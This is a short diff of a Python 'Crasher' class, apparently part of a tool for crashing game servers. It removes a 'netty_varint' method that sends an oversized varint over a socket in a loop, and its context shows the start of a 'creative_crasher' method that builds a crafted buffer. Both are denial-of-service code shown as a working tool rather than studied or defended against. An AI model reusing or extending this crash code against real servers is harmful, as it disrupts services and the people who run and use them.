@@ -20,11 +20,6 @@ class Crasher:
     def __init__(self):
         self.packet_id = b'\x17'
         self.data = bytearray()
-    def netty_varint(self, socket, packet_count):
-        content = Packet.encode_varint(1000000)
-        for i in range(packet_count):
-            socket.sendall(content)
-
     def creative_crasher(self, socket, packet_count):
         buffer = io.BytesIO()
         for i in range(256):
